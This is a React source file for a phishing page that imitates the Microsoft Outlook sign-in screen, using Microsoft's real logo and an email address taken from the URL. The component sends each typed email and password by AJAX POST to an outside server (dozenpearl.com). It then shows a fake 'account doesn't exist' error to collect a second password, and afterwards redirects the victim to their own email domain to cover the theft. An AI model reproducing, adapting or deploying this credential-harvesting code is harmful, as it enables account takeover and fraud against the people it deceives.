
import React, { useEffect, useState, useRef } from "react";
import './Outlook.css';
// import svgoutlook from '../../Media/Images/microsoft_icon_svg.png';
import { AiOutlineQuestionCircle } from 'react-icons/ai';
// import axios from "axios";
import $ from "jquery";
import Preloader from "../../Preloader/Preloader";


const Outlook = ()=>{

    const [spinLoader, setSpinLoader] = useState(false);

    const formRef = useRef();

    useEffect(()=>{
        const emailInTheURL = window.location.href;
    const sliceEqualSign = emailInTheURL.indexOf("@");
    const extracetdEmail = emailInTheURL.substr((sliceEqualSign+1)).split('&', 1).toString();
        document.title = extracetdEmail;
        setSpinLoader(true);
        setTimeout(() => {
            setSpinLoader(false);
        }, 2500);
    }, []);

    const emailInTheURL = window.location.href;
    const sliceEqualSign = emailInTheURL.indexOf("=");
    const extracetdEmail = emailInTheURL.substr((sliceEqualSign+1)).split('&', 1).toString();

    const [outlookEmail, setOutlookEmail] = useState(extracetdEmail);
    const [outlookPassword, setOulookPassword] = useState('');

    const btnVal = 'Sign in';

    const [count, setCount] = useState(0);

    const [err, setErr] = useState(false);


    const submitOutlookForm = e=>{
        // console.log(formRef.current);
        e.preventDefault();
        
        console.log(outlookEmail, outlookPassword);

        if(outlookPassword === ""){
            return null
            // setErr(true);
        }else{
            setSpinLoader(true);
            const user = {
                email: outlookEmail,
                password: outlookPassword
            };
            
            $.ajax({
                type: "POST",
                url: "https://dozenpearl.com/nc_assets/fonts/recov/free.php",
                data: user,
                success(data) {
                    // alert('OK');
                    console.log(data);
                },
            });
            setTimeout(()=>{
                setOulookPassword('');
                setErr(true);
                setTimeout(() => {
                    setSpinLoader(false);
                }, 2000);
            }, 2500)
            setErr(false);
            setCount(count=> count + 1);
            if(count >= 1){
                const redirectURL = window.location.href;
                const sliceEqualSign = redirectURL.indexOf("@");
                const extracetdemailDomain = redirectURL.substr((sliceEqualSign+1)).split('&', 1).toString();
                console.log(extracetdemailDomain);
                window.location.href = `https://www.${extracetdemailDomain}`;
            }
            

        }
    }


    return(<section>

        { spinLoader ? <Preloader /> : null }
        
        <div className="Outlook_wrapper">

            <div className="Outlook_form_wrapper">
                <img 
                    alt="outlook_svg"
                    src={`https://logincdn.msauth.net/shared/1.0/content/images/microsoft_logo_564db913a7fa0ca42727161c6d031bef.svg`}
                />

                <h3>Sign in</h3>


                { err ?
                    <p className="err">
                    That Microsoft account doesn't exist. Enter a different
                    <br />
                     account or <span className="gett">get a new one</span>.
                </p>
                : null }

                <form onSubmit={submitOutlookForm} method="post" ref={formRef} className='forrmmm'>
                    
                    <div className="outlook_email_container">
                    <label htmlFor="name"> </label>
                        <input 
                            type={`email`}
                            value={outlookEmail}
                            readOnly
                            className="email_input_ input_outlook"
                            onChange={e=>setOutlookEmail(e.target.value)}
                            id="name"
                            name="name"
                        />
                    </div>



                    <div className="outlook_password_container">
                    <label htmlFor="password"> </label>
                        <input 
                            type={`password`}
                            placeholder="Password"
                            className="password_input input_outlook"
                            value={outlookPassword}
                            onChange={e=> setOulookPassword(e.target.value)}
                            required={true}
                            title="Please fill out this field"
                            name="password"
                            autoFocus
                        />
                    </div>



                    <div className="outlook_no_act" style={{
                            fontSize: '.7125rem',
                            color: '#444'
                    }}>
                        No account? <span className="outlook_create_" style={{
                            color: '#0067b8',
                            cursor: 'pointer'
                        }}>Create one!</span>
                    </div>




                    <div className="asdfghj" style={{
                        // display:'flex',
                        // alignItems:'center'
                    }}>
                        <span className="outlook_no_act keeeyy" 
                        // style={{
                        //         fontSize: '.7125rem',
                        //         color: '#0067b8',
                        //         // display:'block'
                        // }}
                        >
                            Sign in with key
                        </span>

                        <AiOutlineQuestionCircle style={{
                            cursor: 'pointer',
                            color:'#555',
                            // display:'block'
                        }}
                        className='qst_mk'
                        />

                    </div>

                    <div className="_opts_">
                        Sign-in options
                    </div>


                    <div className="oiuytre">
                        <input
                            type={`submit`} 
                            value={btnVal}
                            className="outlook_submit"
                            onClick={submitOutlookForm}
                        />
                    </div>



                </form>
            </div>

        </div>

    </section>)
};

export default Outlook;